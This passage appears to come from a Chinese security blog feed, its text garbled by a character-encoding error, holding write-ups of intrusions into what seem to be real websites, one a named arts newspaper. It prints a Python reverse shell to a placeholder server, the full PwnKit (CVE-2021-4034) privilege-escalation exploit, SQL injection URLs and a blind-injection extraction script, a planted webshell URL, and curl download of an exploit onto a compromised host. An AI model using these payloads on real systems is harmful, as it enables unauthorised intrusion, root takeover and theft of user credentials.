<br>èšå‰‘æ¢è¡Œæœ‰é—®é¢˜,æ‰€ä»¥å†™ä¸€ä¸ªpythonæ–‡ä»¶è¿è¡Œä¼ å›</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;æœåŠ¡å™¨ip&quot;</span>,æœåŠ¡å™¨ç«¯å£));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231042238.png" width="75%" height="auto">5.é€šè¿‡cve-2021-4034ææƒè‡³rootç½‘ä¸Šæ‰¾çš„exp<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @author: luijait</span></span><br><span class="line"><span class="comment"> * @version: 1.0</span></span><br><span class="line"><span class="comment"> * @CVE: CVE-2021-4034 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">enviroment</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;mkdir &#x27;GCONV_PATH=.&#x27; &amp;&amp; touch &#x27;GCONV_PATH=./tmp&#x27; &amp;&amp; chmod +x &#x27;GCONV_PATH=./tmp&#x27;&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;mkdir tmp;echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCBnY29udih2b2lkKSB7fQoKCnZvaWQgZ2NvbnZfaW5pdCh2b2lkICpzdGVwKQp7CgkvL1Blcm1zIAoJc2V0dWlkKDApOyBzZXRldWlkKDApOyBzZXRnaWQoMCk7IHNldGVnaWQoMCk7CQoJLy9JbnZvcXVlIFNoZWxsCgljaGFyICogc2hlbGxbXSA9IHsgIi9iaW4vYmFzaCIsICItaSIsIE5VTEwgfTsKCS8vRGVmaW5lIFBhdGgKCWNoYXIgKiBlbnZfdmFyc1tdID0geyAiUEFUSD0vdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4iLCBOVUxMIH07CglleGVjdmUoc2hlbGxbMF0sIHNoZWxsLCBlbnZfdmFycyk7CglleGl0KDApOyAKfQo= | base64 -d &gt; tmp/b64load.c; gcc tmp/b64load.c -o tmp/pwnkit.so -shared -fPIC &quot;</span>);</span><br><span class="line">system(<span class="string">&quot;echo bW9kdWxlIFVURi04Ly8gUFdOS0lULy8gcHdua2l0IDIK | base64 -d &gt; tmp/gconv-modules&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Current User before execute exploit\nhacker@victim$whoami: &quot;</span>);</span><br><span class="line">system(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Exploit written by @luijait (0x6c75696a616974)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">banner();</span><br><span class="line"></span><br><span class="line">enviroment();</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> idk[] = &#123;</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> * <span class="type">const</span> entorno[] = &#123;<span class="string">&quot;tmp&quot;</span>, </span><br><span class="line">  <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>, </span><br><span class="line">  <span class="string">&quot;SHELL=/random&quot;</span>, </span><br><span class="line">  <span class="string">&quot;CHARSET=PWNKIT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;GIO_USE_VFS=&quot;</span>,<span class="literal">NULL</span></span><br><span class="line"> &#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n[+] Enjoy your root if exploit was completed succesfully\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, idk, entorno);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>æƒ³ä¼ åˆ°ç›®æ ‡ä¸»æœºç¼–è¯‘æ‰§è¡Œ,å‘ç°ç›®æ ‡æœºå™¨æ²¡æœ‰gccæŠŠåœ¨è‡ªå·±ä¸»æœºä¸Šç¼–è¯‘å¥½çš„expä¼ ä¸Šå»,ä½†è¿˜æ˜¯æŠ¥é”™<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231055052.png" width="75%" height="auto">å‘ç°ç¬¬13è¡Œsystemå‡½æ•°é‡Œè¿˜æœ‰åˆ°gcc,åªè¦æŠŠç¼–è¯‘å¥½çš„pwnkit.soä¼ åˆ°ç›®æ ‡çš„tmpæ–‡ä»¶å¤¹ä¸‹å³å¯æˆåŠŸææƒ<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231057270.png" width="75%" height="auto">4.å°è¯•ç™»å½•åå°æ³„éœ²æºç ä¸­æœ‰å¤šä¸ªæ•°æ®åº“ä¿¡æ¯,æµ‹è¯•å‡ºæ¥åªæœ‰ä¸€ä¸ªèƒ½è¿ä¸Š<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401251037955.png" width="50%" height="auto"><p>æ‰¹é‡è·å–ç”¨æˆ·è´¦æˆ·å’Œå¯†ç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231231928.png" width="75%" height="auto"></p><p>è§£å¯†è§£ä¸å‡ºæ¥,å»çœ‹loginæºç å‘ç°å¯ç–‘å¯†ç å†™åœ¨æºç é‡Œ,ç™»é™†æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401231536785.png" width="75%" height="auto"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401251047583.png" width="75%" height="auto"></p><h2 id="3-æ€»ç»“"><a href="#3-æ€»ç»“" class="headerlink" title="3.æ€»ç»“"></a>3.æ€»ç»“</h2><p>1.æŸ¥çœ‹æ³„éœ²æ–‡ä»¶æ—¶åº”æ³¨æ„ç‰¹æ®Šæ–‡ä»¶(å¦‚æå°çš„å›¾ç‰‡æ–‡ä»¶)<br>2.ç›®æ ‡æœºå™¨æ²¡æœ‰gccå¯ä»¥æœ¬åœ°ç¼–è¯‘å†ä¼ ä¸Šå»æ‰§è¡Œ<br>3.æ³„éœ²çš„æºç ä¸ä¸€å®šå¯é ,å¦‚æœèƒ½æ¸—é€è¿›å»åº”å®¡è®¡çœŸå®ä»£ç </p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€å®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡SQLæ³¨å…¥æ¸—é€å®æˆ˜</title>
      <link href="/2024/01/25/%E8%AE%B0%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
      <url>/2024/01/25/%E8%AE%B0%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="1-æ¸—é€ç›®æ ‡"><a href="#1-æ¸—é€ç›®æ ‡" class="headerlink" title="1.æ¸—é€ç›®æ ‡"></a>1.æ¸—é€ç›®æ ‡</h2><p>æŸè‰ºæœ¯æŠ¥ç¤¾</p><h2 id="2-æ¸—é€æµç¨‹"><a href="#2-æ¸—é€æµç¨‹" class="headerlink" title="2.æ¸—é€æµç¨‹"></a>2.æ¸—é€æµç¨‹</h2><p>1.SQLæ³¨å…¥<br>è¾“å…¥\æç¤ºæŠ¥é”™ä¿¡æ¯</p><p>æœç´¢å‹é—­åˆ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table where name like &#x27;aaa%&#x27; or name like &#x27;1%&#x27; limit 0,1;</span><br><span class="line">select * from table where name like &#x27;aaa%&#x27; or name like &#x27;1%&#x27; and &#x27;%&#x27;=&#x27;%&#x27; limit 0,1;</span><br><span class="line">1%&#x27; and &#x27;%&#x27;=&#x27;</span><br></pre></td></tr></table></figure><p>ç»æµ‹è¯•,ç›®æ ‡ç«™ç‚¹ä¸æ˜¯åŒ¹é…ç‰¹å®šå­—ç¬¦è¿‡æ»¤,è€Œæ˜¯å¯¹åŒ¹é…åˆ°çš„ç‰¹å®šè¯­å¥è¿‡æ»¤<br>è¿‡æ»¤å†…å®¹ä¸æ›¿æ¢<br>and:  ||<br>=:  like<br>select table_name:/*!select*/ table_name</p><p>åº“å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ç›®æ ‡]/search.php?q=1%27%20||extractvalue(1,concat(0x7e,(select%20database()),0x7e))||%20%27%251%25%27%3d%27%251#gsc.tab=0&amp;gsc.q=1&#x27;%20%7C%7C%20&#x27;%251%25&#x27;%3D&#x27;%251&amp;gsc.page=1</span><br></pre></td></tr></table></figure><p>è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ç›®æ ‡]/search.php?q=1%27%20||extractvalue(1,concat(0x7e,(/*!select*/%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20like%20%27[åº“å]%27),0x7e))||%20%27%251%25%27%3d%27%251#gsc.tab=0&amp;gsc.q=1&#x27;%20%7C%7C%20&#x27;%251%25&#x27;%3D&#x27;%251&amp;gsc.page=1 </span><br><span class="line">å‘ç°å–ä¸å…¨è¦ä¸€ä¸ªä¸€ä¸ªå–</span><br><span class="line"></span><br><span class="line">http://www.mottimes.com/cht/search.php?q=1%27%20||extractvalue(1,concat(0x7e,(/*!select*/%20table_name%20from%20information_schema.tables%20where%20table_schema%20like%20%27[åº“å]%27 limit 1,1),0x7e))||%20%27%251%25%27%3d%27%251#gsc.tab=0&amp;gsc.q=1&#x27;%20%7C%7C%20&#x27;%251%25&#x27;%3D&#x27;%251&amp;gsc.page=1</span><br><span class="line">è·å–è¡¨å</span><br></pre></td></tr></table></figure><p>åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ç›®æ ‡]/search.php?q=1%27%20||extractvalue(1,concat(0x7e,(/*!select*/ group_concat(column_name) from information_schema.columns where table_schema like &#x27;[æ•°æ®åº“å]&#x27; || table_name like &#x27;[è¡¨å]&#x27;),0x7e))||%20%27%251%25%27%3d%27%251#gsc.tab=0&amp;gsc.q=1&#x27;%20%7C%7C%20&#x27;%251%25&#x27;%3D&#x27;%251&amp;gsc.page=1</span><br><span class="line">æå–åˆ—å</span><br></pre></td></tr></table></figure><p>ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://[ç›®æ ‡]/search.php?q=1%27%20||extractvalue(1,concat(0x7e,(/*!select*/%20group_concat(id)%20from%20[è¡¨å]),0x7e))||%20%27%251%25%27%3d%27%251#gsc.tab=0&amp;gsc.q=1&#x27;%20%7C%7C%20&#x27;%251%25&#x27;%3D&#x27;%251&amp;gsc.page=1</span><br><span class="line"></span><br><span class="line">é€šè¿‡çœ‹pwså’Œidè·å–è´¦å·å¯†ç </span><br></pre></td></tr></table></figure><p>2.æ–‡ä»¶ä¸Šä¼ +RCE<br><a href="http://www.mottimes.com/image/mottimes_images/mottimes_images_8120240124140310.php">http://www.mottimes.com/image/mottimes_images/mottimes_images_8120240124140310.php</a><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401241405008.png" width="75%" height="auto"><br>ç‚¹å‡»ä¸Šä¼ ï¼Œcontent-typeæ”¹ä¸ºimage&#x2F;jpegç›´æ¥ä¸Šä¼ æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401241406106.png" width="75%" height="auto"><br>ç›´æ¥èšå‰‘è¿æ¥,å‘ç°æ€ä¹ˆè¿éƒ½è¿ä¸ä¸Š<br>ç”¨system,passthruç­‰å‡½æ•°éƒ½æ‰§è¡Œä¸äº†æ¨æµ‹æœ‰waf<br>ä½¿ç”¨åå¼•å·`å¯ä»¥æ‰§è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401242305776.png" width="75%" height="auto"><br>å†™pythonæ–‡ä»¶æ‰§è¡Œå¼¹å›shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pass</span>=echo `echo <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;æœåŠ¡å™¨ip&quot;,æœåŠ¡å™¨ç«¯å£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> &gt; /tmp/ttta.py`</span><br><span class="line"><span class="keyword">pass</span>=echo `python /tmp/ttta.py`;</span><br></pre></td></tr></table></figure><p>3.ææƒ<br>è‡ªå·±å¼€ä¸ªhttpæœåŠ¡,ä¸Šé¢æ”¾ç¼–è¯‘å¥½çš„cve-2021-4034exp<br>ç›®æ ‡æœºå™¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -O &quot;expæ–‡ä»¶&quot;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯ææƒ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401242303007.png" width="75%" height="auto"></p><h2 id="3-æ€»ç»“"><a href="#3-æ€»ç»“" class="headerlink" title="3.æ€»ç»“"></a>3.æ€»ç»“</h2><p>1.å¾ˆå¤šæƒ…å†µsqlæ³¨å…¥ä¼šåŒ¹é…ç‰¹å®šçš„å­—ç¬¦ä¸²ç»„åˆ,éœ€æƒ³åŠæ³•ç»„åˆç»•è¿‡,æå–æ•°æ®åº“ä¿¡æ¯å°½å¯èƒ½æå–å…¨ã€‚<br>2.é’ˆå¯¹wafæŸ¥æ€,webshellè¿æ¥å·¥å…·å¯é€‰ç”¨ä¸åŒç¼–ç ã€‚<br>å¸¸è§rceæ–¹å¼:system,exec,passthru,åå¼•å·<br>3.æ— æ³•è¿æ¥webshellæ—¶å¯ä»¥ç›´æ¥ä¼ shellæ¥æ”¶<br>æ–‡ä»¶å¯ä»¥ç”¨curlä¸‹è½½</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€å®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVDæŒ–æ˜è¿‡ç¨‹ä¸­çš„ä¸€æ¬¡SQLæ³¨å…¥åˆ†æ</title>
      <link href="/2023/12/04/CNVD%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2023/12/04/CNVD%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="1-æ¸—é€ç›®æ ‡"><a href="#1-æ¸—é€ç›®æ ‡" class="headerlink" title="1.æ¸—é€ç›®æ ‡"></a>1.æ¸—é€ç›®æ ‡</h2><p>http:&#x2F;&#x2F;[ç›®æ ‡]&#x2F;General&#x2F;User&#x2F;UserListPager<br>è¯¥æ¥å£é€šè¿‡postå‚æ•°å¯ä»¥æå–ç”¨æˆ·ä¿¡æ¯,Idå¤„å­˜åœ¨sqlæ³¨å…¥<br>ç”¨sqlmapåªå¯ä»¥è·‘å‡ºæ¥å †å æ³¨å…¥,ç»“æœä¸ç¨³å®šæ‰€ä»¥é€‰æ‹©æ‰‹å·¥åˆ†æ,åˆ¤æ–­æ˜¯å¦å¯ä»¥å¸ƒå°”å‹æ³¨å…¥ã€‚</p><h2 id="2-æ¸—é€æµç¨‹"><a href="#2-æ¸—é€æµç¨‹" class="headerlink" title="2.æ¸—é€æµç¨‹"></a>2.æ¸—é€æµç¨‹</h2><p>1.å•å¼•å·é—­åˆæå–æ‰€æœ‰ä¿¡æ¯<br>èƒ½æå–å‡ºæ‰€æœ‰ä¿¡æ¯,messageä¸ºnull</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CurrentNum=1&amp;PageSize=1000&amp;keyword=a&amp;searchEnterpriseId=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;searchOrganizationId=</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401271142656.png" width="100%" height="auto">çŒœæµ‹sqlè¯­å¥<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from [è¡¨å] where enterpriseId=&#x27;[id]&#x27;;</span><br></pre></td></tr></table></figure><p>2.è¯­å¥ä¸ºçœŸå–å‡ºä¿¡æ¯,æ³¨é‡Šç¬¦æ³¨é‡Šæ‰åç»­å†…å®¹,<br>messageä¸ºNo data</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CurrentNum=1&amp;PageSize=1000&amp;keyword=a&amp;searchEnterpriseId=1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; --+&amp;searchOrganizationId=</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401271411898.png" width="75%" height="auto">3.å€ŸåŠ©æ­¥éª¤1æ—¶æå–å‡ºçš„ä¸€ä¸ªenterpriseIdæ³¨å…¥,ä½¿ç”¨æ³¨é‡Šç¬¦,messageä¸ºNo data<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CurrentNum=1&amp;PageSize=1000&amp;keyword=a&amp;searchEnterpriseId=1b5df7a9f48646aa9028a8415d059697&#x27; --+&amp;searchOrganizationId=</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401271413382.png" width="85%" height="auto">4.å€ŸåŠ©enterpriseIdæ³¨å…¥,ä½¿ç”¨å•å¼•å·é—­åˆ,messageä¸ºnull<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CurrentNum=1&amp;PageSize=1000&amp;keyword=a&amp;searchEnterpriseId=1b5df7a9f48646aa9028a8415d059697&#x27; or &#x27;1&#x27;=&#x27;1&amp;searchOrganizationId=</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401271417739.png" width="75%" height="auto">5.å…¶ä»–æµ‹è¯•<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CurrentNum=1&amp;PageSize=1000&amp;keyword=a&amp;searchEnterpriseId=1 --+&amp;searchOrganizationId=</span><br><span class="line">&#123;&quot;CurrentNum&quot;:1,&quot;PageSize&quot;:1000,&quot;TotalCount&quot;:0,&quot;Info&quot;:[],&quot;tag&quot;:1,&quot;message&quot;:null&#125;</span><br><span class="line">CurrentNum=1&amp;PageSize=1000&amp;keyword=a&amp;searchEnterpriseId=1&#x27; --+&amp;searchOrganizationId=</span><br><span class="line">&#123;&quot;CurrentNum&quot;:1,&quot;PageSize&quot;:1000,&quot;TotalCount&quot;:0,&quot;Info&quot;:[],&quot;tag&quot;:1,&quot;message&quot;:&quot;No data&quot;&#125;</span><br></pre></td></tr></table></figure><p>6.æ¨æµ‹:<br>TotalCountä¸ºæ‰§è¡Œè¯­å¥åæå–çš„ä¿¡æ¯çš„æ¡æ•°ã€‚<br>å½“è¯­å¥èƒ½å¤Ÿæ­£ç¡®æ‰§è¡Œæ—¶,å¦‚æœæœ‰æ³¨é‡Šç¬¦åˆ™è¯­å¥ä¹Ÿä¼šæ‰§è¡Œä½†ä¸ä¼šæ­£å¸¸è¿”å›jsonæ•°æ®,åŒæ—¶Messageå˜ä¸ºNo dataã€‚<br>å¦‚æœæ²¡æœ‰æ³¨é‡Šç¬¦è€Œæ˜¯é‡‡ç”¨â€™1â€™&#x3D;â€™1æ–¹å¼é—­åˆ,åˆ™å¯ä»¥æ­£å¸¸æ‰§è¡Œå¹¶è¿”å›jsonæ•°æ®ï¼ŒMessageä¸ºnullã€‚</p><h2 id="3-è„šæœ¬ç¼–å†™"><a href="#3-è„šæœ¬ç¼–å†™" class="headerlink" title="3.è„šæœ¬ç¼–å†™"></a>3.è„šæœ¬ç¼–å†™</h2><p>é€šè¿‡ä»¥ä¸‹å‚æ•°ç¼–å†™exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchEnterpriseId=1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; --+&amp;searchOrganizationId=&amp;keyword=1&amp;PageSize=15&amp;CurrentNum=1</span><br></pre></td></tr></table></figure><p>å½“åˆ¤æ–­ä¸ºå‡ï¼Œè¿”å›çš„totalcountä¸º0<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401271443287.png" width="75%" height="auto"><br>å½“åˆ¤æ–­ä¸ºçœŸï¼Œè¿”å›çš„totalcountä¸º13<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401271442370.png" width="75%" height="auto"><br>æå–åº“å:<br>sqlserveræ•°æ®åº“ï¼Œä½¿ç”¨substringå’Œdb_name()</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://[ç›®æ ‡]/General/User/UserListPager&quot;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"><span class="comment">#ä»posä½æˆªå–</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">Â  Â  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">Â  Â  Â  Â  payload = <span class="string">&quot;1&#x27; or ascii(substring((select db_name()),&quot;</span>+<span class="built_in">str</span>(pos)+<span class="string">&quot;,1))=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot; --+&quot;</span></span><br><span class="line">Â  Â  Â  Â  data = &#123;<span class="string">&quot;searchEnterpriseId&quot;</span>:payload,<span class="string">&quot;searchOrganizationId&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;keyword&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;PageSize&quot;</span>:<span class="string">&quot;15&quot;</span>,<span class="string">&quot;CurrentNum&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">Â  Â  Â  Â  ret = requests.get(url,data=data,proxies=proxies)</span><br><span class="line">Â  Â  Â  Â  judge = ret.json()[<span class="string">&quot;TotalCount&quot;</span>]</span><br><span class="line">Â  Â  Â  Â  <span class="comment">#æ ¹æ®ç«™ç‚¹çš„Totalcountåˆ¶å®š</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> (judge == <span class="number">13</span>):</span><br><span class="line">Â  Â  Â  Â  Â  Â  res = res+<span class="built_in">chr</span>(i)</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401271557282.png" width="75%" height="auto"><h2 id="4-æ€»ç»“"><a href="#4-æ€»ç»“" class="headerlink" title="4.æ€»ç»“"></a>4.æ€»ç»“</h2><p>1.é¢å¯¹å¤šå‚æ•°sqlæ³¨å…¥æ—¶éœ€æ³¨æ„ç»†èŠ‚ï¼ŒæŸ¥çœ‹å‘é€ä¸åŒå‚æ•°å¯¼è‡´çš„ç»“æœå˜åŒ–ã€‚<br>2.å·¥å…·æœ‰æ—¶æµ‹ä¸å‡ºæ¥æˆ–æµ‹å‡ºæ¥æœ‰é—®é¢˜å¯ä»¥æ‰‹æµ‹ç„¶åè‡ªå·±å†™è„šæœ¬ã€‚<br>3.ä¸åŒæ•°æ®åº“æ³¨å…¥æ—¶è¯­æ³•ä¸ä¸€æ ·ï¼Œå†™è„šæœ¬è¦ç”¨å¯¹åº”çš„å‡½æ•°ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¸—é€å®æˆ˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€(å››)-æƒé™æå‡</title>
      <link href="/2023/09/07/%E5%9F%9F%E6%B8%97%E9%80%8F(%E5%9B%9B)-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>/2023/09/07/%E5%9F%9F%E6%B8%97%E9%80%8F(%E5%9B%9B)-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<p>æƒé™æå‡å¯ä»¥åˆ†ä¸ºæ¨ªå‘æƒé™æå‡å’Œçºµå‘æƒé™æå‡<br>1.æ¨ªå‘ç§»åŠ¨ï¼šåŒç”¨æˆ·çº§åˆ«ä¹‹é—´ï¼Œç”±ä¸€ä¸ªç”¨æˆ·æ¥ç®¡å¦ä¸€ä¸ªç”¨æˆ·æƒé™<br>2.çºµå‘ç§»åŠ¨ï¼šç”±è¾ƒä½ç”¨æˆ·æƒé™è·å–æ›´é«˜çš„ç”¨æˆ·æƒé™ï¼ˆä¾‹å¦‚è·å–ç®¡ç†å‘˜ã€ç³»ç»Ÿçº§åˆ«çš„æƒé™ï¼‰</p><h2 id="1-ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ"><a href="#1-ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ" class="headerlink" title="1.ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ"></a>1.ç³»ç»Ÿå†…æ ¸æ¼æ´ææƒ</h2><h4 id="1-å¯»æ‰¾ç³»ç»Ÿæ½œåœ¨æ¼æ´"><a href="#1-å¯»æ‰¾ç³»ç»Ÿæ½œåœ¨æ¼æ´" class="headerlink" title="1.å¯»æ‰¾ç³»ç»Ÿæ½œåœ¨æ¼æ´"></a>1.å¯»æ‰¾ç³»ç»Ÿæ½œåœ¨æ¼æ´</h4><p>1.æ‰‹åŠ¨å¯»æ‰¾å¯ç”¨æ¼æ´<br>æŸ¥çœ‹å·²å®‰è£…è¡¥ä¸</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç»“åˆç³»ç»Ÿç‰ˆæœ¬å’Œç›¸å…³è¾…åŠ©ç½‘ç«™å¯»æ‰¾å¯ç”¨çš„ææƒæ¼æ´</p><p>2.å€ŸåŠ©WES-NGæŸ¥æ‰¾å¯ç”¨æ¼æ´<br><a href="https://github.com/bitsadmin/wesng">GitHub - bitsadmin&#x2F;wesng: Windows Exploit Suggester - Next Generation</a><br>a.æ›´æ–°æœ€æ–°çš„æ¼æ´åº“æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 wes.py --update</span><br></pre></td></tr></table></figure><p>b.æ‰§è¡Œsysteminfoå¹¶å°†ç»“æœä¿å­˜åˆ°sysinfo.txt,ç„¶åç”¨WES-NGè¿›è¡Œæ£€æŸ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;systeminfo &gt; sysinfo.txt</span><br><span class="line">C:\&gt;python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;</span><br><span class="line">#--impactæŒ‡å®šæ¼æ´ç±»å‹ä¸ºææƒæ¼æ´</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061024328.png" alt="image.png"><br>c.å¯»æ‰¾æ‰€æœ‰å·²å…¬å¼€çš„exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only</span><br></pre></td></tr></table></figure><p>ä»¥æµ‹è¯•æœºWin7ä¸ºä¾‹<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061033001.png" alt="image.png"></p><h4 